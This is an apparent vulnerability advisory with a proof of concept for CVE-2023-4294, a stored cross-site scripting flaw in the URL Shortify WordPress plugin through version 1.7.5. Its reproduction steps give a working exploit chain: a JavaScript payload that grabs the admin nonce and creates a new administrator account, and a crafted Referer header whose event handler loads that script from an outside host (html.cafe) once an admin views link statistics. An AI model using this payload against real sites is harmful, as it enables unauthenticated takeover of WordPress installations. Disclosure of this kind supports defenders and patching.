**CVE ID**: CVE-2023-4294

**Vulnerability Type**: Cross-Site Scripting

**Description**: The URL Shortify plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the referrer header in versions up to, and including, 1.7.5 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

**Steps to reproduce**:

```
1. Add a new shortened link in the interface <host>/wp-admin/admin.php?page=us_links&action=new, in this case it will be:
<host>/mr83

2. Prepare a JavaScript code that will automatically add a new user with administrator privileges to the website and host it on an external resource, e.g. html.cafe.

const url = 'https://<host>/wp-admin/user-new.php';fetch(url).then(response => response.text()).then(html => {const parser = new DOMParser();const doc = parser.parseFromString(html, 'text/html');const nonceValue = doc.getElementById('_wpnonce_create-user').value;const requestOptions = {method: 'POST',headers: {'Content-Type': 'application/x-www-form-urlencoded'},body: `action=createuser&_wpnonce_create-user=${encodeURIComponent(nonceValue)}&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=administrator&email =a@a.com&first_name=&last_name=&url=&pass1=O%21k6c5%5EfjO%5E1sF%26%24%21%26V2PG9e&pass2=O%21k6c5%5EfjO%5E1sF%26%24%21%26V2PG9e&send_user_notification=0&role=admin &ure_other_roles=&createuser =Add+New+User`};return fetch(url, requestOptions);});

3. Send request with a crafted referer header value.

GET /mr83 HTTP/1.1
Host: <host>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Referer: https://example.com'abc=""onmouseover='var scriptElement=document.createElement(`script`);scriptElement.src=`https://html.cafe/x…d`;document.head .appendChild(scriptElement);
Connection: close

4. Wait for the administrator interaction with the vulnerable "Referer" field in the statistics of the created link.
<host>/wp-admin/admin.php?page=us_links&action=statistics&_wpnonce=5252159b66&id=1

5. Log in to the newly created administrator account. 
```

**Reference**: 
1. https://wpscan.com/vulnerability/1fc71fc7-861a-46cc-a147-1c7ece9a7776
2. https://www.cve.org/CVERecord?id=CVE-2023-4294
3. https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/url-shortify/url-shortify-175-unauthenticated-stored-cross-site-scripting-via-referrer-header
